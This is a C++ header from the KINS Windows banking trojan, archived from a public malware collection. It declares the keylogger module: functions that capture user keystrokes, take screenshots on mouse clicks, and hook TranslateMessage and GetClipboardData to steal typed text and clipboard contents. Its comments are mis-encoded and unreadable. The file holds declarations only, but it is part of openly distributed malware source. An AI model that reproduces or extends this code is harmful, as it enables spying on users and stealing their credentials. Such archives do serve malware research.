/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  �������� ����� ������������.
*/
#pragma once

namespace UserHook
{
#if BO_KEYLOGGER > 0
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);
  
  /*
    ������� ������ ����� ������������.
  */
  void clearInput(void);

  /*
    ��������� ������� ������� �����.

    OUT buffer - �����, ���������� ���������� ����� Mem.

    Return     - 0 - ���� ����� �����, *buffer ����� ����� NULL.
                 >0 - ������ buffer � ��������, �������� ������� ������.
  */
  DWORD getInput(LPWSTR *buffer);

  void enableImageOnClick(WORD clicksCount, LPSTR filePrefix);
  
  /*
    ����������� TranslateMessage.
  */
  BOOL WINAPI hookerTranslateMessage(const MSG *msg);

  /*
    ����������� GetClipboardData.
  */
  HANDLE WINAPI hookerGetClipboardData(UINT format);


#endif

};
